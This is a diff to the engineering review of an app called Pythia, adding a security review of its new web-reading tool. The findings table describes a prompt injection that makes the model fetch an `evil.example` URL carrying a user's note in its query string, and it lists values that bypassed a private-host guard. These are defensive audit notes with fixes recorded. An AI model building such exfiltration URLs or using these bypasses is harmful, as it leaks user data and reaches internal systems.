@@ -1,6 +1,8 @@
 # Engineering Review — Pythia
 
-*Updated: 2026-09-25 — **Tavily gaps closed (ADR-217).** The model can filter a search by topic, time range and site, and a new `read_url` tool reads one page through /extract. Private addresses are refused before any request, and the 8 000-char cut is named. Crawl, map, research and advanced depth are deferred (D-56, D-57). The Tavily contract is tested against a mocked `requestUrl` only.*
+*Updated: 2026-09-25 — **ADR-217 review: six findings fixed.** `read_url` could exfiltrate data through a URL the model built. It now reads only links the user gave or a result returned (exact match, ≤ 5 per answer, fails closed). URL credentials are refused; the trailing-dot and IPv4-mapped bypasses of the private-host guard are closed; `wantsWeb` is tested; one excluded site is named.*
+
+*Previously updated: 2026-09-25 — **Tavily gaps closed (ADR-217).** The model can filter a search by topic, time range and site, and a new `read_url` tool reads one page through /extract. Private addresses are refused before any request, and the 8 000-char cut is named. Crawl, map, research and advanced depth are deferred (D-56, D-57). The Tavily contract is tested against a mocked `requestUrl` only.*
 
 *Previously updated: 2026-09-25 — **#382 closed: the four low findings fixed too** (ADR-216 second addendum). Open/closed per conversation for the session (user's decision), and a new pin leaves the strip as it was (user's decision, now tested); `chartLabel` in `services/chartSpec.ts` is the one naming rule for the card and the strip; `BLOCK_FINDERS` is a Record the compiler checks; each pin body is one child component, released on re-render and hide.*
 
@@ -1936,4 +1938,16 @@ A comparison of `services/WebSearchService.ts` with Tavily's API found Pythia us
 | **Crawl, map, research, advanced depth, auto-parameters.** | — | Deferred: D-56, D-57 |
 
 **Not verified live.** docs.tavily.com was unreachable from the session. Parameter names come from Tavily's `langchain-tavily` wrapper. Make one real call per endpoint before release.
+
+### Review of ADR-217 (four rings), 2026-09-25
+
+| Item | Ring | Severity | Status |
+|---|---|---|---|
+| **`read_url` could exfiltrate data.** A planted instruction could make the model read `https://evil.example/log?d=<note>`, and Tavily would deliver the query string to the attacker. | Security | High | Closed: `WebReadScope` exact-match allow-list (user links + links returned this answer), fails closed |
+| **URL credentials were forwarded** (`https://user:pw@host/`). | Security | Medium | Closed: refused, not echoed |
+| **The private-host guard could be bypassed** by `localhost.` / `nas.local.` and by `[::ffff:127.0.0.1]`. | Security | Medium-low | Closed |
+| **The auto-arm composition lived in the untested view.** | Tests | Low | Closed: `sendPolicy.wantsWeb` |
+| **No cap on page reads per answer** (25 rounds × 8 000 chars). | Performance | Low | Closed: 5 per answer |
+| **`excluding 2`** had no noun; the model's and the chip's wordings differed. | Clarity | Low | Closed: one site named, several counted |
+| `search(string \| SearchArgs)` keeps a string form only the older tests use. | Clarity | Low | Won't fix (cosmetic) |
 
